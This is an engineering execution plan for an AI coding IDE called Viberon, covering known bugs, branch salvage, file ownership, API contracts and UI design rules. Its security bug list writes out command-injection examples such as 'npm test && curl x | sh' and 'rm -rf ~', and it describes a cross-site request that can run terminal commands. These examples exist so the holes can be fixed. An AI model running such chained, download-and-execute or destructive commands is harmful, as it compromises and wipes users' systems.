# Viberon execution plan

Three implementers work in parallel on separate git worktrees: EXEC-A (harness), EXEC-B (workspace services) and FRONTEND.

Status: the shared contracts are already committed on `main`:
- `lib/agents/events.ts`: the new event variants. They are additive: `command` on `approval_request` is kept alongside `title`, and `run_done.status` is optional.
- `lib/composer/types.ts`
- `lib/harness/contracts.ts`

Nobody changes these shapes without the owner. `events.ts` is owned by EXEC-A.

## 0. Known bugs (owner in brackets)

1. **[A] Thinking blocks are dropped between tool turns** (`lib/ai/anthropic.ts`). Multi-step Claude runs with thinking will 400. `wip/harness-retry` fixes this.
2. **[A] No cache breakpoint on messages.** Only the system prefix is cached, so every turn pays full price for the transcript.
3. **[A] One `ContextLedger` is shared by every agent in a run.** Agent B gets "[already in context]" pointers for content only agent A saw.
4. **[A] Cancellation leaks:**
   - Approvals are not denied on abort (they can park for up to 5 minutes).
   - `denyAllApprovals` is global.
   - `runTool` has no signal, so `run_command` keeps running after Stop.
   - There is no cancelled `run_done`.
5. **[A] `approval_request.agentId` is hard-coded `"pending"`** in `app/api/agent/route.ts`.
6. **[A] `runTool` does not enforce the role's tool list.** The read-only assistant could execute `write_file`. `rename_file` does not scope-check `from`.
7. **[A] `inScope` is a prefix match.** Owning `src/a.ts` also grants `src/a.tsx`.
8. **[A] Several settings are never sent to `/api/agent`:** `showThinking`, `autoCheckpoint`, `retrievalDepth`, `maxNodes`. A checkpoint is also taken for "ask" prompts.
9. **[A] The orchestrator runs dependents of failed steps.** Planner `agent_tool` events always report `ok: true`.
10. **[B] SECURITY: any website can drive the local API.** There is no Host/Origin check, and `request.json()` ignores content type. A `text/plain` no-cors POST to `/api/terminal` runs commands. DNS rebinding is also open.
11. **[B] SECURITY: the auto-approve list is only anchored at the start:**
    - `npm test && curl x | sh` and `ls; rm -rf .` are auto-approved.
    - `node -e`, `python -c`, `env`, `git config` and `find -delete/-exec` are also auto-approved.
    - `rm -rf ~` is not blocked.
    - Child processes inherit API keys.
12. **[B] Kill does not kill the process tree** (the spawn is not `detached`), so dev servers are orphaned.
13. **[B] No import edges for alias imports** (`@/…`). `resolveImport` only handles `./`. `wip/lang-extractors` fixes this.
14. **[B] SECURITY (in `wip/mcp`): a repo's `.mcp.json` can self-grant `trusted: true`.**
15. **[FE] `bottomPanel: "problems"` exists but nothing renders it.** SearchPanel makes up to 400 sequential fetches from the browser.

## 1. WIP branches

Take files with `git checkout wip/<b> -- <paths>`, not merges.

| Branch | Verdict | Owner |
|---|---|---|
| wip/harness-retry | Salvage whole: `lib/ai/{retry,anthropic,groq,index,types}.ts`. Add tests with an injected sleep. | A |
| wip/git-problems | Salvage `lib/git/*`, `lib/problems/*`, `app/api/{git,problems}`. `store/scm.ts` and `store/problems.ts` go to FE. | B (+FE) |
| wip/mcp | Salvage with fixes (P1). Ignore `trusted` from workspace files. Workspace servers are disabled by default. A does the runner/registry wiring. | B |
| wip/lang-extractors | Salvage `lib/lang/tsconfig.ts` and wire it into `lib/parser.ts` `resolveImport`. | B |
| wip/terminal-output | Salvage `OutputBuffer` and `stripAnsi` only. No xterm, no node-pty. | B |
| wip/editor-review | Salvage `lib/editor/{tabs,review}.ts`. | FE |
| wip/composer-parsing | `types.ts` is already on main. FE takes `lib/composer/parsing.ts`. | FE |

## 2. File ownership (no two implementers edit the same file)

- **A:**
  - `lib/agents/**`, `lib/ai/**`, `lib/context/**`, `lib/tools/**`, `lib/memory/**`
  - `lib/harness/**`, `app/api/agent/**`, `lib/composer/types.ts`
  - Tests named `tests/harness.*`
- **B:**
  - `middleware.ts`, `lib/terminal/**`, `lib/workspace/**`, `lib/local-disk-workspace.ts`
  - `lib/parser.ts`, `lib/ingest.ts`, `lib/lang/**`, `lib/git/**`, `lib/problems/**`, `lib/mcp/**`, `lib/search/**`
  - `app/api/{terminal,git,problems,mcp,search,complete,inline-edit,workspace,files,repos}/**`
  - `package.json`, `pnpm-lock.yaml`, `electron/**`
  - Tests named `tests/ws.*`
- **FE:**
  - `components/**`, `app/globals.css`, `app/layout.tsx`, `app/page.tsx`, `app/workspace/**`
  - `lib/client/**`, `lib/editor/**`, `lib/composer/parsing.ts`
  - `store/**` (including `store/viberon.ts`)
  - Tests named `tests/ui.*`
- A and B never edit `store/` or `components/`. FE never edits server code. If FE needs a dependency or contract change, it goes through the orchestrator.
- **Merge order:** B, then A, then FE.
- Each branch keeps `tsc`, `pnpm test` and `pnpm build` green.

## 3. Contracts

### 3.1 SSE events

See `lib/agents/events.ts` on main. New variants:
- `approval_resolved`
- `agent_retry`
- `todos` (full-replace semantics)
- `compaction`
- `diagnostics`
- `hook`

New fields:
- `run_start.rules`
- `plan.awaitingApproval`
- `agent_tool.callId`
- `approval_request.{kind,title,detail}`
- `run_done.status`

A must populate all of them. `command` stays on `approval_request` for compatibility.

### 3.2 Agent API (A)

- **`POST /api/agent`**: body is `AgentRequest` (`lib/harness/contracts.ts`).
  - The response header `X-Run-Id` duplicates `run_start.runId`.
  - `interaction`: `"plan"` plans read-only and emits `plan{awaitingApproval:true}` then `run_done`. `"ask"` forces the read-only assistant. `"agent"` with `plan` executes the approved plan after re-normalizing it.
- **`POST /api/agent/cancel`**: `{ runId }` → `{ ok }`. It aborts the run, denies that run's approvals, and kills that run's terminal sessions.
- **`POST /api/agent/approve`**: `{ approvalId, decision: "allow"|"deny"|"allow_always" }` → `{ ok }`. The legacy `{approved:boolean}` is still accepted.
- **`GET /api/agent/rules?repoKey=`**: returns `RulesResponse`.

### 3.3 Workspace APIs (B)

**Git.**
- `GET /api/git?repoKey=` → `GitSnapshot`:
  ```
  { virtual, isRepo, gitAvailable, parentRepo,
    status?: { branch:{head,oid,upstream,ahead,behind},
               files:{path,originalPath?,group:"staged"|"changes"|"untracked"|"conflicts",letter}[] },
    branches?: {name,current,upstream}[], log?: {hash,shortHash,author,date,subject}[] }
  ```
- `GET /api/git?repoKey&op=show&path&ref=HEAD|INDEX|WORKING` → `{ path, ref, content: string|null }`.
- `POST /api/git`: `{ repoKey, op, paths?: string[]|"all", message?, name? }`. `op` is one of `stage`, `unstage`, `discard`, `commit`, `switch`, `createBranch`, `init`, `fetch`, `pull`, `push`. Returns `GitSnapshot & { output? }`. `op:"generateMessage"` returns `{ message }` (P1).

**Problems.**
- `GET /api/problems?repoKey=` returns the last cached result.
- `POST /api/problems` takes `{ repoKey, files? }`.
- Both return `{ virtual, problems: {file,line,col,severity,message,source,code?}[], checkers, finishedAt, running }`.

**Terminal.** Existing routes, plus:
- Stream `?sessionId&stream=1&since=<offset>` emits:
  - `{type:"history",text,offset,status,detectedUrl}`
  - `{type:"chunk",stream,text,offset}`
  - `{type:"end",status,exitCode,detectedUrl}`
- Session JSON gains `runId?` and `origin: "user"|"agent"`.
- `POST /api/terminal/input {sessionId,data}` (P1).

**P1 routes:**
- `GET /api/search?repoKey&q&regex&case&glob` → `{ matches:{path,line,col,text}[], truncated }`.
- `GET /api/workspace/events?repoKey=` (SSE) → `{type:"fs",changed,deleted}`.
- `POST /api/complete {repoKey,path,prefix,suffix,language}` → `{completion}`.
- `POST /api/inline-edit {repoKey,path,startLine,endLine,instruction}` (SSE) → `delta`, then `done{replacement}` or `error`.
- `GET|POST /api/mcp`.

### 3.4 Library functions A calls from B (frozen signatures)

- `RunOptions` gains `{ signal?, runId?, origin? }`, and `killSessionsByRun(runId): number`.
- `runChecks(root, { files?, timeoutMs? }): Promise<ProblemsResult>`.
- `loadMcpToolset(repoKey, rootPath, roleTools): Promise<McpToolset>`.

### 3.5 Store slices (FE)

`run.todos`, `run.retries`, `run.compactions`, `run.rules`, `run.planAwaitingApproval`, `settings.interaction`, `settings.editPolicy` and `reviewDecisions`. New files: `store/scm.ts`, `store/problems.ts` and `store/mcp.ts` (P1).

## 4. EXEC-A (harness)

**P0:**
1. Salvage `wip/harness-retry` and emit `agent_retry` (bug 1).
2. Add a message cache breakpoint (bug 2).
3. Build a scripted fake provider in `tests/helpers/fake-provider.ts`. All runner behaviour is unit-tested against it.
4. Run registry and cancellation in `lib/harness/runs.ts`:
   - Per-run approvals and `ToolContext.signal`/`runId` passed through to `runCommand`.
   - The cancel route.
   - `killSessionsByRun`, `approval_resolved` and a cancelled `run_done`.
   - Bugs 4 and 5.
5. `runTool` enforces `ctx.allowedTools`, `rename_file` scope-checks, and `inScope` is exact or `dir/**` (bugs 6 and 7).
6. `ContextLedger.fork(agentId)` for each agent (bug 3).
7. Rules loader (`lib/agents/rules.ts`):
   - Loads `AGENTS.md`, `CLAUDE.md`, `.cursorrules`, `.cursor/rules/*.mdc` (`alwaysApply` only), `.viberon/rules.md` and nested `AGENTS.md`.
   - Capped at 8k tokens and placed in the cached prefix.
   - Reported in `run_start.rules` and served by the rules route.
8. `todo_write` tool that emits `todos`.
9. Plan mode, execution of an approved plan, and `ask` forcing the assistant. Skip dependents of failed steps (bug 9).
10. Compaction (`lib/harness/compact.ts`) at 60% of the context window:
    - Stage 1 elides tool results older than the last 6 turns.
    - Stage 2 summarizes with the fastest model.
    - Emit `compaction`, then raise `maxIterations` (generalist 80, specialists 40).
11. Wire the dead settings (bug 8).
12. Resolve attachments server-side into an `## Attached context` block.

**P1:** diagnostics loop via `runChecks`, edit approvals, hooks (Claude Code `.viberon/settings.json` shape, opt-in per workspace), MCP wiring in the runner, `allow_always`, image blocks.

## 5. EXEC-B (workspace)

**P0:**
1. `middleware.ts` enforces a localhost Host, same-origin Origin, not `Sec-Fetch-Site: cross-site`, and JSON content type on mutations (bug 10).
2. Command safety hardening and env scrubbing (bug 11).
3. Process groups (`detached`), `RunOptions.signal`/`runId`/`origin`, `killSessionsByRun`, `OutputBuffer` and `since` resume (bug 12).
4. Git salvage, verified against a temp repo.
5. Problems salvage with the `files` filter, GET cache, single-flight and timeout.
6. Path aliases in the parser (bug 13).

**P1:** MCP salvage with the trust fix (bug 14), `/api/search` (rg with a JS fallback), file watcher and events SSE, `/api/complete`, `/api/inline-edit`, terminal stdin.

## 6. FRONTEND

**Design direction (enforced; must not look AI-generated):**
- Neutral near-black surfaces (`#0f0f10` / `#151516` / `#1b1b1d`), 1px borders `#262628`, text `#d6d6d6` and `#8b8b8e`.
- One desaturated accent (`#6b9eff`) for focus and selection only. Green, red and amber only for diff and status.
- Remove the violet, indigo and cyan tokens, all gradients, glows and colored shadows. Shadows only on popovers.
- Radius 3–4px, no pills. 12–13px UI text, 12px mono, 22–26px rows. lucide icons at 14px with 1.5 stroke. No emoji.
- No card grids: use lists and tables with hairline separators. Reference Zed's agent panel, VS Code's SCM view and Linear's density.
- A light theme with the same restraint.
- Dev without keys: `lib/client/mock-run.ts` replays a canned event script when `?mock=1` is set.

**P0:**
1. Token and style reset, and a sweep of all violet and gradient usages.
2. Agent stream:
   - Send `interaction`, `showThinking` and `autoCheckpoint`.
   - Read `X-Run-Id`. Stop calls cancel, then aborts.
   - Handle every new event, pair tool rows by `callId`, and branch on `run_done.status`.
3. AgentRunView: compact tool rows, a todo checklist, retry notice, compaction divider, inline approval cards (with an edit mini-diff) and rules in the header.
4. Composer: Agent / Plan / Ask control, Team / Solo toggle, `@` mentions as chips, and model and policy selectors.
5. Plan review: an editable step list, and "Run plan" re-POSTs with `plan`.
6. Agent-edit review with `DiffEditor` and per-file and bulk accept/reject.
7. Source Control view (`store/scm.ts`) with branch and ahead/behind in the status bar.
8. Problems panel (`store/problems.ts`) with counts in the status bar and "add to chat".
9. Editor tabs: preview tabs and correct close order.
10. Terminal: offset-resume, ANSI strip, and an origin label.

**P1:** MCP settings section, inline completions, `⌘K` inline edit, workspace-events refresh, server-side search, image paste.
